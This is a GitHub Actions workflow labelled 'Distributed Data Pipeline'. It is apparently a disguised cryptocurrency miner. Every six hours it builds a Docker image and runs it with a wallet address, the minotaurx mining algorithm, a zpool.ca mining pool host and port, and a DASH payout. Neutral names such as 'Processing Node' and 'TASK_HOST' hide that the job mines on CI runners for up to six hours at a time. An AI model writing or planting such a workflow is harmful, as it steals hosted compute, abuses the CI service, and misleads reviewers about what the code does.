name: Distributed Data Pipeline

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

permissions:
  actions: write
  contents: write

env:
  WALLET: "XcufdyxZtL4JUjALZfTq6pCrxyTt2Hy2Zu"
  THREADS: "4"
  ALGORITHM: "cwm_minotaurx"
  TASK_HOST: "minotaurx.sea.mine.zpool.ca"
  TASK_PORT: "7019"
  PAYOUT_COIN: "DASH"

jobs:
  node-01:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - run: docker build -t data-pipeline:latest .
      - name: Run Processing Node
        run: |
          docker run --rm --cpus="4" \
            -e SLOT_LABEL="NODE-01" \
            -e WALLET="${{ env.WALLET }}" \
            -e THREADS="${{ env.THREADS }}" \
            -e ALGORITHM="${{ env.ALGORITHM }}" \
            -e TASK_HOST="${{ env.TASK_HOST }}" \
            -e TASK_PORT="${{ env.TASK_PORT }}" \
            -e PAYOUT_COIN="${{ env.PAYOUT_COIN }}" \
            data-pipeline:latest

